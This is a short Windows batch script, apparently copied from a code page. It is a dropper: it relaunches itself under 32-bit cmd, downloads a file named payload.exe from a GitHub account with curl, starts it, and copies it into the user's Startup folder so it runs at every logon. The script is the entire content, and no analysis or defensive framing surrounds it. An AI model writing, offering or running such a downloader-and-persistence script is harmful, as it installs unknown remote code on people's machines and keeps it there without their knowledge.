batch
Copy code
@echo off
:: Check if the script is running in a 64-bit CMD on a 64-bit OS
if "%PROCESSOR_ARCHITECTURE%" == "AMD64" (
    if not defined PROCESSOR_ARCHITEW6432 (
        echo Running in 64-bit CMD on a 64-bit system...
        :: Restart the script using the 32-bit CMD
        C:\Windows\SysWOW64\cmd.exe /C "%~f0" %*
        exit /b
    )
)

:: If the script reaches here, it is running in a 32-bit CMD
echo Running in 32-bit CMD...

:: Download the payload
echo Downloading payload...
curl -L -o payload.exe https://github.com/johnny575/ADB-device/blob/main/payload.exe
:: Execute the payload
echo Executing payload...
start payload.exe

:: Copy the payload to the Startup folder for persistence
echo Copying payload to the Startup folder...
set STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
copy payload.exe "%STARTUP_FOLDER%\payload.exe"

echo Done
